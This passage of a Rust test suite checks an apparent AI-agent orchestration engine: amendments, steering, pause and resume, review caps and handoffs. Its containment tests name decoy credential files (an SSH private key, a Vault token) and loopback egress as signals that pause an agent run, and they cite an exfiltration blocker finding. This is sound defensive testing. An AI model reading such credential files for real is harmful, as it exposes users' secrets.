    h.finish(&id, ExecutionStatus::Denied, None);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    let s = h.summaries();
    assert!(s.contains(&"blocked phase 1".to_string()));
    assert!(s.contains(&"spawn implementer phase 3 initial".to_string()));
    assert!(!s.iter().any(|x| x.contains("phase 2")));
    assert!(ostra_engine::plan::removed_phases(&h.state()).contains(&2));
}

// ------------------------------------------------------------------------------------------
// D10: a requirement change after the plan restarts at the spec.
// ------------------------------------------------------------------------------------------

#[test]
fn d10_change_at_plan_approval_goes_to_spec() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    h.decide(
        JudgeKind::Stakes,
        None,
        json!({"stakes": "high", "reason": "r"}),
    );
    h.run("spawn plan", plan_submit(one_phase()));
    h.run(
        "spawn fact-check fact-check-plan",
        fact("PASS", "plan", &[]),
    );
    let g = h.open_gate("plan_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: false,
            feedback: Some("Drop the retry logic".into()),
        },
    );
    h.deliver(&g);
    let spec = h.spawn_step("spawn generate-spec");
    assert_eq!(
        spec.inputs.changes,
        vec!["Drop the retry logic".to_string()]
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run(
        "spawn fact-check fact-check-spec",
        fact("PASS", "spec", &[]),
    );
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: true,
            feedback: None,
        },
    );
    let plan = h.spawn_step("spawn plan");
    assert!(
        plan.inputs.findings.is_none(),
        "a spec-change revision, not a FAIL re-run"
    );
    assert!(
        plan.inputs.target.is_some(),
        "the earlier plan is revised in place"
    );
    h.run("spawn plan", plan_submit(one_phase()));
    let check = h.spawn_step("spawn fact-check fact-check-plan");
    assert_eq!(
        check.inputs.prior_findings.as_deref(),
        Some("no findings on the previous pass")
    );
}

// D10: a spec revision gets only the input its spec does not reflect yet.
#[test]
fn d10_spec_revision_gets_only_new_input() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let first = h.spawn_step("spawn generate-spec");
    assert!(
        first.inputs.new_research_docs.is_empty(),
        "a first run reads every research document"
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("PASS", "spec", &[]));
    let g = h.open_gate("spec_approval");
    h.answer(
        &g,
        GateAnswer::Approval {
            approved: false,
            feedback: Some("Drop the retry logic".into()),
        },
    );
    h.deliver(&g);
    let rev = h.spawn_step("spawn generate-spec");
    assert_eq!(rev.inputs.changes, vec!["Drop the retry logic".to_string()]);
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.run("spawn fact-check", fact("FAIL", "spec", &["x"]));
    let fix = h.spawn_step("spawn generate-spec");
    assert!(
        fix.inputs.changes.is_empty(),
        "an applied change is not sent again"
    );
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.ev(SessionEvent::RequestAmended {
        text: "also handle refunds".into(),
        files: vec![],
        uploads: vec![],
        delivery: ContextDelivery::Queue,
        routed: false,
    });
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let amended = h.spawn_step("spawn generate-spec");
    assert_eq!(amended.inputs.research_docs.len(), 2);
    assert_eq!(amended.inputs.new_research_docs.len(), 1);
    assert_eq!(
        amended.inputs.changes,
        vec!["The user extended the request: also handle refunds".to_string()]
    );
}

#[test]
fn an_amendment_logged_before_c2_explores_the_new_part_first() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    h.ev(SessionEvent::RequestAmended {
        text: "also handle refunds".into(),
        files: vec![],
        uploads: vec![],
        delivery: ContextDelivery::Queue,
        routed: false,
    });
    assert_eq!(h.summaries(), vec!["spawn explore explore#1"]);
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let spec = h.spawn_step("spawn generate-spec");
    assert!(spec.inputs.task.unwrap().contains("also handle refunds"));
    assert_eq!(spec.inputs.research_docs.len(), 2);
}

// ------------------------------------------------------------------------------------------
// Context files, context delivery, pause, and containment (Rules C1, C2, P1, P2, P3)
// ------------------------------------------------------------------------------------------

fn file(project: &str, path: &str) -> ContextFile {
    ContextFile {
        project: project.into(),
        path: path.into(),
    }
}

/// Add context as the runner does: a classified session routes it through the judge (Rule C2).
fn amend(h: &mut H, text: &str, files: Vec<ContextFile>, delivery: ContextDelivery) {
    let routed = h.state().routes_amendments();
    h.ev(SessionEvent::RequestAmended {
        text: text.into(),
        files,
        uploads: vec![],
        delivery,
        routed,
    });
}

/// The Route answer judge's decision on the amendment at `i` (Rule C2).
fn route_amendment(h: &mut H, i: usize, output: Value) {
    let subject = ostra_engine::state::amendment_subject(i);
    h.decide(JudgeKind::RouteAnswer, Some(&subject), output);
}

/// Deliver the amendment as a requirement change with one research task in `project`.
fn amendment_with_research(h: &mut H, i: usize, project: &str, task: &str) {
    route_amendment(
        h,
        i,
        json!({"route": "requirement_change", "items": [{"id": "answer", "disposition": "deliver"}], "research": [{"project": project, "task": task}], "reason": "r"}),
    );
}

#[test]
fn attached_files_reach_the_agents_as_absolute_paths() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    if let SessionEvent::SessionCreated { files, .. } = &mut h.events[0].event {
        *files = vec![file("p", "docs/orders.md")];
    }
    h.classify("IMPLEMENT", &["p"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    let task = h.spawn_step("spawn generate-spec").inputs.task.unwrap();
    assert!(
        task.contains("`/code/p/docs/orders.md` (@p/docs/orders.md)"),
        "{task}"
    );
}

#[test]
fn uploads_reach_the_agents_as_their_copies_in_the_session() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    let upload = UploadedFile {
        name: "notes.pdf".into(),
        path: root().join("uploads/notes.pdf"),
        size: 3,
    };
    if let SessionEvent::SessionCreated { uploads, .. } = &mut h.events[0].event {
        *uploads = vec![upload.clone()];
    }
    h.classify("IMPLEMENT", &["p"]);
    h.run("spawn explore explore#0", explore_submit(0, &[]));
    let task = h.spawn_step("spawn generate-spec").inputs.task.unwrap();
    assert!(
        task.contains("Files the user uploaded with the request"),
        "{task}"
    );
    assert!(
        task.contains(&format!("`{}`", upload.path.display())),
        "{task}"
    );
}

#[test]
fn files_added_later_reach_the_next_step() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    amend(
        &mut h,
        "see @p/src/refund.rs",
        vec![file("p", "src/refund.rs")],
        ContextDelivery::Queue,
    );
    amendment_with_research(&mut h, 0, "p", "read the refund code");
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let task = h.spawn_step("spawn generate-spec").inputs.task.unwrap();
    assert!(
        task.contains("Added later by the user: see @p/src/refund.rs"),
        "{task}"
    );
    assert!(task.contains("`/code/p/src/refund.rs`"), "{task}");
}

#[test]
fn queued_context_lets_running_work_finish() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    amend(&mut h, "also refunds", vec![], ContextDelivery::Queue);
    assert!(h.state().interrupting.is_empty());
    // Rule C2: queued context waits for the running spec, and nothing starts before it.
    assert!(h.summaries().is_empty(), "{:?}", h.summaries());
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
    amendment_with_research(&mut h, 0, "p", "research refunds");
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let revision = h.spawn_step("spawn generate-spec");
    assert_eq!(
        revision.inputs.changes,
        vec!["The user extended the request: also refunds".to_string()]
    );
}

#[test]
fn context_sent_now_reruns_the_interrupted_step_fresh() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    amend(&mut h, "also refunds", vec![], ContextDelivery::Now);
    assert_eq!(
        h.state().interrupting.get(&spec),
        Some(&ostra_engine::state::Interrupt::Context)
    );
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert!(h.state().interrupting.is_empty());
    // Rule C2: the interrupted spec waits for the judge instead of starting again at once.
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
    amendment_with_research(&mut h, 0, "p", "research refunds");
    // Rule D2 still holds: the research the judge queued runs before the spec runs again.
    assert_eq!(h.summaries(), vec!["spawn explore explore#1"]);
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    let rerun = h.spawn_step("spawn generate-spec");
    assert_eq!(rerun.resumes, None);
    assert!(rerun.inputs.task.unwrap().contains("also refunds"));
}

#[test]
fn c2_interrupted_research_waits_for_the_judge_and_reruns_with_the_context() {
    let mut h = H::new(&["api", "mcp"], SessionOptions::default());
    h.classify("IMPLEMENT", &["api"]);
    let (research, first) = h.start("spawn explore explore#0");
    amend(&mut h, "Work in mcp, not api", vec![], ContextDelivery::Now);
    h.finish(&research, ExecutionStatus::Interrupted, None);
    // Nothing re-runs, and the judge's research is not started, until the judge decides.
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
    amendment_with_research(&mut h, 0, "mcp", "find the config loader");
    let rerun = h.spawn_step("spawn explore explore#0");
    let task = rerun.inputs.task.unwrap();
    assert!(
        task.starts_with(first.inputs.task.as_deref().unwrap()),
        "{task}"
    );
    assert!(
        task.contains("Work in mcp, not api"),
        "the re-run sees the context: {task}"
    );
    // The research goes to the project the judge named, not the first project in scope.
    assert_eq!(h.spawn_step("spawn explore explore#1").project, "mcp");
}

#[test]
fn c2_discarded_context_reaches_no_agent() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    amend(&mut h, "ignore this, a typo", vec![], ContextDelivery::Now);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard"}], "research": [], "reason": "r"}),
    );
    let rerun = h.spawn_step("spawn generate-spec");
    assert!(!rerun.inputs.task.unwrap().contains("a typo"));
    assert!(rerun.inputs.changes.is_empty());
}

#[test]
fn c2_context_that_changes_no_requirement_leaves_the_spec() {
    let mut h = H::spec_approved(&["p"], SessionOptions::default());
    amend(
        &mut h,
        "name the module orders_cancel",
        vec![],
        ContextDelivery::Queue,
    );
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "deliver"}], "research": [], "reason": "r"}),
    );
    let st = h.state();
    assert!(st.spec.approved, "the approved spec stands");
    assert!(st.full_request().contains("name the module orders_cancel"));
}

#[test]
fn c2_remembered_context_becomes_a_note_for_later_stages() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    amend(
        &mut h,
        "test with a real database",
        vec![],
        ContextDelivery::Queue,
    );
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "remember", "stages": ["tests"], "note": "Test with a real database."}], "research": [], "reason": "r"}),
    );
    let st = h.state();
    assert!(!st.full_request().contains("real database"));
    assert_eq!(
        st.notes_for(ostra_engine::judge::NoteStage::Tests),
        vec!["Test with a real database.".to_string()]
    );
}

fn withdraw(h: &mut H, index: u32) {
    h.ev(SessionEvent::AmendmentWithdrawn { index });
}

fn steer(h: &mut H, id: &ExecutionId, text: &str) {
    h.ev(SessionEvent::ExecutionSteered {
        id: id.clone(),
        text: text.into(),
    });
}

#[test]
fn c2_queued_context_can_be_withdrawn_before_it_is_read() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    amend(&mut h, "also refunds", vec![], ContextDelivery::Queue);
    assert_eq!(h.state().held_amendments().collect::<Vec<_>>(), vec![0]);
    withdraw(&mut h, 0);
    let st = h.state();
    assert!(st.amendments[0].withdrawn);
    assert!(st.held_amendments().next().is_none());
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
    assert!(!h.state().full_request().contains("refunds"));
}

#[test]
fn c2_context_already_released_cannot_be_withdrawn() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    h.run("spawn generate-spec", spec_submit(0, 0));
    // Nothing runs, so queued context is released at once and goes to the judge.
    amend(&mut h, "also refunds", vec![], ContextDelivery::Queue);
    withdraw(&mut h, 0);
    let st = h.state();
    assert!(!st.amendments[0].withdrawn);
    assert!(st.amendments[0].pending);
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
}

#[test]
fn c2_context_sent_now_is_never_held() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    amend(&mut h, "also refunds", vec![], ContextDelivery::Now);
    assert!(h.state().held_amendments().next().is_none());
    withdraw(&mut h, 0);
    assert!(!h.state().amendments[0].withdrawn);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
}

#[test]
fn u2_a_correction_resumes_the_run_in_place() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    steer(&mut h, &spec, "Read src/refund.rs, not src/order.rs.");
    assert_eq!(
        h.state().interrupting.get(&spec),
        Some(&ostra_engine::state::Interrupt::Steer)
    );
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#2"]);
    assert_eq!(
        h.spawn_step("spawn generate-spec").resumes,
        Some(spec.clone())
    );
    assert_eq!(
        h.state().steers.get(&spec).map(|x| x.text.as_str()),
        Some("Read src/refund.rs, not src/order.rs.")
    );
    assert!(
        !h.state().steer_queued(&spec),
        "sent to a running run, it cannot be withdrawn"
    );
    h.ev(SessionEvent::ExecutionResumed { id: spec.clone() });
    let st = h.state();
    assert!(st.steers.is_empty());
    assert_eq!(st.spec.runs, vec![spec], "a correction is not a new run");
}

#[test]
fn u2_corrections_sent_before_the_run_stops_join() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    steer(&mut h, &spec, "First.");
    steer(&mut h, &spec, "Second.");
    assert_eq!(
        h.state().steers.get(&spec).map(|x| x.text.as_str()),
        Some("First.\n\nSecond.")
    );
}

#[test]
fn u2_a_correction_to_a_paused_run_waits_and_can_be_withdrawn() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    steer(&mut h, &spec, "Use sqlx.");
    let st = h.state();
    assert!(st.steer_queued(&spec));
    assert!(st.interrupting.is_empty());
    h.ev(SessionEvent::SteerWithdrawn { id: spec.clone() });
    assert!(h.state().steers.is_empty());
    steer(&mut h, &spec, "Use diesel.");
    h.ev(SessionEvent::SessionResumed);
    assert_eq!(
        h.spawn_step("spawn generate-spec").resumes,
        Some(spec.clone())
    );
    assert_eq!(
        h.state().steers.get(&spec).map(|x| x.text.as_str()),
        Some("Use diesel.")
    );
}

#[test]
fn u2_a_run_that_ends_first_drops_the_correction() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    steer(&mut h, &spec, "Use sqlx.");
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    let st = h.state();
    assert!(st.steers.is_empty());
    assert!(!st.can_steer(&spec));
    assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
}

#[test]
fn u2_context_sent_now_replaces_a_correction() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    steer(&mut h, &spec, "Use sqlx.");
    amend(&mut h, "also refunds", vec![], ContextDelivery::Now);
    let st = h.state();
    assert_eq!(
        st.interrupting.get(&spec),
        Some(&ostra_engine::state::Interrupt::Context)
    );
    assert!(st.steers.is_empty());
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert!(
        h.state().resume_from.is_empty(),
        "it re-runs fresh with the context"
    );
}

#[test]
fn u2_queued_context_lets_a_corrected_run_resume() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    steer(&mut h, &spec, "Use sqlx.");
    amend(
        &mut h,
        "name it orders_cancel",
        vec![],
        ContextDelivery::Queue,
    );
    assert_eq!(h.state().held_amendments().count(), 1);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["judge route-answer amendment:0"]);
    route_amendment(
        &mut h,
        0,
        json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "deliver"}], "research": [], "reason": "r"}),
    );
    assert_eq!(h.spawn_step("spawn generate-spec").resumes, Some(spec));
}

#[test]
fn u2_a_finished_or_waiting_run_takes_no_correction() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
    steer(&mut h, &spec, "Too late.");
    assert!(h.state().steers.is_empty());
}

#[test]
fn paused_session_starts_nothing() {
    let mut h = H::explored(
        &["p"],
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    let (spec, _) = h.start("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    assert_eq!(
        h.state().interrupting.get(&spec),
        Some(&ostra_engine::state::Interrupt::Pause)
    );
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert!(h.summaries().is_empty(), "{:?}", h.summaries());
}

#[test]
fn resumed_session_continues_the_paused_run() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    h.ev(SessionEvent::SessionResumed);
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#2"]);
    assert_eq!(h.spawn_step("spawn generate-spec").resumes, Some(spec));
    h.start("spawn generate-spec");
    assert!(h.state().resume_from.is_empty());
}

#[test]
fn p2_a_resume_continues_the_same_execution() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    h.ev(SessionEvent::SessionResumed);
    h.ev(SessionEvent::ExecutionResumed { id: spec.clone() });
    let st = h.state();
    let running: Vec<_> = st.running_executions().map(|r| r.id.clone()).collect();
    assert_eq!(running, vec![spec.clone()]);
    assert_eq!(
        st.spec.runs,
        vec![spec.clone()],
        "a resume is not a new run"
    );
    assert!(st.resume_from.is_empty());
    assert!(h.summaries().is_empty(), "{:?}", h.summaries());
    h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 1)));
    assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
}

#[test]
fn p2_a_resumed_work_run_is_not_counted_twice() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    let work = |h: &H| h.state().phases[&1].impl_loop.work_count;
    let before = work(&h);
    h.ev(SessionEvent::SessionPaused);
    h.finish(&id, ExecutionStatus::Interrupted, None);
    h.ev(SessionEvent::SessionResumed);
    assert_eq!(h.spawn_step("spawn implementer").resumes, Some(id.clone()));
    h.ev(SessionEvent::ExecutionResumed { id: id.clone() });
    assert_eq!(work(&h), before);
    assert_eq!(h.state().phases[&1].impl_loop.running, Some(id));
}

#[test]
fn p3_a_resumed_execution_counts_signals_from_zero() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    for n in 0..3 {
        signal(&mut h, &spec, n);
    }
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    h.ev(SessionEvent::SessionResumed);
    h.ev(SessionEvent::ExecutionResumed { id: spec.clone() });
    assert!(!h.state().signals.contains_key(&spec));
    for n in 0..3 {
        signal(&mut h, &spec, n);
    }
    assert!(h.state().paused, "three new signals pause it again");
}

#[test]
fn context_added_while_paused_reruns_instead_of_resuming() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    amend(&mut h, "also refunds", vec![], ContextDelivery::Queue);
    h.ev(SessionEvent::SessionResumed);
    amendment_with_research(&mut h, 0, "p", "research refunds");
    h.run("spawn explore explore#1", explore_submit(1, &[]));
    assert_eq!(h.spawn_step("spawn generate-spec").resumes, None);
}

#[test]
fn a_run_started_during_the_pause_is_interrupted_too() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let req = h.spawn_step("spawn generate-spec");
    h.ev(SessionEvent::SessionPaused);
    let id = ExecutionId::new();
    h.ev(SessionEvent::ExecutionStarted {
        id: id.clone(),
        agent: req.agent,
        purpose: req.purpose.clone(),
        stage: req.stage,
        project: req.project.clone(),
        executor: ExecutorKind::Native,
        model: "mock:m".into(),
        params: json!({}),
        spawn_block: String::new(),
        report_path: None,
        resumes: None,
    });
    assert_eq!(
        h.state().interrupting.get(&id),
        Some(&ostra_engine::state::Interrupt::Pause)
    );
}

fn signal(h: &mut H, execution: &ExecutionId, n: u16) {
    h.ev(SessionEvent::ContainmentSignal {
        execution: execution.clone(),
        signal: ContainmentSignal::Egress {
            host: "127.0.0.1".into(),
            port: 8000 + n,
        },
    });
}

#[test]
fn p3_three_containment_signals_pause_the_session() {
    let mut h = H::explored(
        &["p"],
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    let (spec, _) = h.start("spawn generate-spec");
    for n in 0..3 {
        signal(&mut h, &spec, n);
    }
    let st = h.state();
    assert!(st.paused);
    assert_eq!(st.contained, Some(spec.clone()));
    assert_eq!(
        st.interrupting.get(&spec),
        Some(&ostra_engine::state::Interrupt::Pause)
    );
    h.finish(&spec, ExecutionStatus::Interrupted, None);
    assert!(h.summaries().is_empty(), "{:?}", h.summaries());
    // Continuing is the user's "this was fine": the run resumes and its signal count restarts.
    h.ev(SessionEvent::SessionResumed);
    assert_eq!(h.state().contained, None);
    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#2"]);
}

#[test]
fn p3_decoy_opens_are_signals_like_the_others() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    signal(&mut h, &spec, 0);
    for path in ["/home/u/.ssh/id_rsa", "/home/u/.vault-token"] {
        h.ev(SessionEvent::ContainmentSignal {
            execution: spec.clone(),
            signal: ContainmentSignal::Decoy { path: path.into() },
        });
    }
    let st = h.state();
    assert!(st.paused);
    assert_eq!(st.contained, Some(spec));
}

#[test]
fn p3_two_signals_or_signals_spread_over_executions_do_not_pause() {
    let mut h = H::explored(&["p"], SessionOptions::default());
    let (spec, _) = h.start("spawn generate-spec");
    signal(&mut h, &spec, 0);
    signal(&mut h, &spec, 1);
    signal(&mut h, &ExecutionId::new(), 2);
    let st = h.state();
    assert!(!st.paused);
    assert!(st.interrupting.is_empty());
    assert_eq!(st.contained, None);
}

// ------------------------------------------------------------------------------------------
// Hard 4 and Hard 13, staging, the review loop.
// ------------------------------------------------------------------------------------------

#[test]
fn hard4_missing_submit_is_a_failure() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Ok, None);
    assert_eq!(mcp_steps(&h), vec!["gate execution_failed"]);
}

#[test]
fn hard13_phase_spawns_carry_the_phase_file() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let imp = h.spawn_step("spawn implementer");
    assert!(imp.inputs.phase.as_ref().unwrap().file.is_some());
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    let rev = h.spawn_step("spawn code-reviewer");
    assert!(rev.inputs.phase.as_ref().unwrap().file.is_some());
    assert_eq!(rev.inputs.changed_files, vec!["src/a.rs".to_string()]);
    assert_eq!(rev.inputs.phase_value.as_deref(), Some("1"));
}

#[test]
fn staging_after_review_passes() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.run(
        "spawn implementer",
        impl_submit(1, &["src/a.rs", "src/b.rs"]),
    );
    h.run("spawn code-reviewer", review(&[]));
    let steps = h.steps();
    let Some(Step::Command {
        purpose: CommandPurpose::Stage,
        files,
        ..
    }) = steps.first()
    else {
        panic!("{:?}", h.summaries())
    };
    assert_eq!(files, &vec!["src/a.rs".to_string(), "src/b.rs".to_string()]);
}

#[test]
fn review_loop_splits_autofix_fix_and_caps_at_three() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    // C1 is auto-fixable in this project; PHASE-REQ never is, whatever its Fix text.
    h.run(
        "spawn code-reviewer",
        review(&[
            finding("LOW", "C1"),
            finding("HIGH", "PHASE-REQ-1"),
            finding("LOW", "C9"),
        ]),
    );
    assert_eq!(h.summaries(), vec!["autofix phase 1"]);
    h.ev(SessionEvent::AutofixApplied {
        project: "p".into(),
        phase: 1,
        tests: false,
        applied: vec!["x".into()],
        failed: vec![],
    });
    let fix = h.spawn_step("spawn implementer phase 1 fix");
    let text = fix.inputs.instructions.unwrap();
    assert!(
        text.contains("PHASE-REQ-1") && !text.contains("C9"),
        "only HIGH and MEDIUM go to the fix agent"
    );
    assert!(
        fix.inputs
            .ledger_file
            .unwrap()
            .ends_with("ostra-review-ledger-phase-1.md")
    );
    h.run(
        "spawn implementer phase 1 fix",
        impl_submit(1, &["src/a.rs"]),
    );
    h.run(
        "spawn code-reviewer review phase 1 #2",
        review(&[finding("HIGH", "R2")]),
    );
    h.run(
        "spawn implementer phase 1 fix",
        impl_submit(1, &["src/a.rs"]),
    );
    h.run(
        "spawn code-reviewer review phase 1 #3",
        review(&[finding("MEDIUM", "R3")]),
    );
    assert_eq!(
        h.summaries(),
        vec!["gate review_cap"],
        "the 4th pass is a gate"
    );
    let g = h.open_gate("review_cap");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "another-pass".into(),
            text: None,
        },
    );
    assert_eq!(
        h.summaries(),
        vec!["spawn implementer phase 1 fix (continues)"]
    );
}

#[test]
fn only_low_findings_exit_the_loop() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    h.run("spawn code-reviewer", review(&[finding("LOW", "C9")]));
    assert_eq!(h.summaries(), vec!["command stage p"]);
}

// ------------------------------------------------------------------------------------------
// Hard 21: BLOCKER findings go alone to the fix agent, with no cap, and block docs.
// ------------------------------------------------------------------------------------------

#[test]
fn hard21_blocker_has_no_cap() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    for i in 1..=5 {
        h.run(
            &format!("spawn code-reviewer review phase 1 #{i}"),
            review(&[finding("BLOCKER", "SEC-BLOCK-EXFIL"), finding("HIGH", "R1")]),
        );
        let fix = h.spawn_step("spawn implementer phase 1 blockerfix");
        let text = fix.inputs.instructions.unwrap();
        assert!(
            text.contains("SEC-BLOCK-EXFIL") && !text.contains("(R1)"),
            "only BLOCKER findings, with a removal instruction"
        );
        assert!(text.contains("Remove"));
        h.run(
            "spawn implementer phase 1 blockerfix",
            impl_submit(1, &["src/a.rs"]),
        );
    }
    assert!(!h.summaries().contains(&"gate review_cap".to_string()));
}

#[test]
fn hard21_open_blocker_blocks_docs() {
    let mut h = H::plan_approved(
        &["p"],
        one_phase(),
        SessionOptions {
            docs: true,
            tests: false,
            yolo: false,
            track: None,
        },
    );
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    h.run(
        "spawn code-reviewer",
        review(&[finding("BLOCKER", "SEC-BLOCK-EXFIL")]),
    );
    let (id, _) = h.start("spawn implementer phase 1 blockerfix");
    h.finish(&id, ExecutionStatus::Denied, None);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    let steps = h.summaries();
    assert!(
        !steps
            .iter()
            .any(|s| s.contains("spawn documentation") || s.starts_with("write-book")),
        "{steps:?}"
    );
}

// ------------------------------------------------------------------------------------------
// HANDOFF and STUCK.
// ------------------------------------------------------------------------------------------

#[test]
fn handoff_runs_prompt_generation_then_resumes() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    h.run(
        "spawn implementer",
        json!({"status": "handoff", "report_path": "/r", "changed_files": [], "summary": "s",
               "handoff": {"specialist": "prompt-generation", "request": "author the agent prompt", "target_files": ["agents/x.md"], "resume_instructions": "wire it into step 3"}}),
    );
    let pg = h.spawn_step("spawn prompt-generation handoff");
    assert_eq!(pg.inputs.task.as_deref(), Some("author the agent prompt"));
    h.run("spawn prompt-generation handoff", report("/pg"));
    let resume = h.spawn_step("spawn implementer phase 1 resume");
    assert!(
        resume
            .inputs
            .instructions
            .unwrap()
            .contains("wire it into step 3")
    );
}

#[test]
fn stuck_goes_to_rescue_never_a_plain_retry() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(
        &id,
        ExecutionStatus::Ok,
        Some(json!({"status": "stuck", "report_path": "/r", "changed_files": [], "summary": "s",
                     "stuck": {"diagnostic": "error[E0433]: failed to resolve: use of undeclared crate", "need": "the crate name"}})),
    );
    assert_eq!(h.summaries(), vec![format!("judge rescue {id}")]);
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "rerun", "fact": "The crate is `ostra_core`.", "reason": "r"}),
    );
